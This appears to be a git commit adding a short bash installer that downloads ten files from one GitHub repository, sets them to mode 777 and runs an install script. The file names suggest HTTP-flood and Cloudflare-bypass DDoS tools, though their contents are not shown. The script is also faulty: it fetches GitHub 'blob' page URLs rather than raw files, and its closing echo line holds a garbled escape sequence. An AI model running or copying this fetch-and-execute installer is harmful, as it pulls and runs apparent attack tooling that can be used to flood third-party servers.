8d7c962fc57f543ab10f4dd8d82cfc213d3d5e77
maker2524211 <101542198+maker2524211@users.noreply.github.com>
2022-07-22 11:47:11 +0800

    Add files via upload

---
+++ aaa.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+wget https://github.com/maker2524211/maker/blob/main/HTTP-RAW.js
+wget https://github.com/maker2524211/maker/blob/main/cc1.sh
+wget https://github.com/maker2524211/maker/blob/main/by
+wget https://github.com/maker2524211/maker/blob/main/bycfx.js
+wget https://github.com/maker2524211/maker/blob/main/httpraw
+wget https://github.com/maker2524211/maker/blob/main/httpX.js
+wget https://github.com/maker2524211/maker/blob/main/httpX.sh
+wget https://github.com/maker2524211/maker/blob/main/install
+wget https://github.com/maker2524211/maker/blob/main/pf
+wget https://github.com/maker2524211/maker/blob/main/up
+chmod 777 HTTP-RAW.js cc1.sh by bycfx.js httpraw httpX.js httpX.sh install pf up
+./install
+
+    echo -e "\033[32m  by UIU\300[0m"
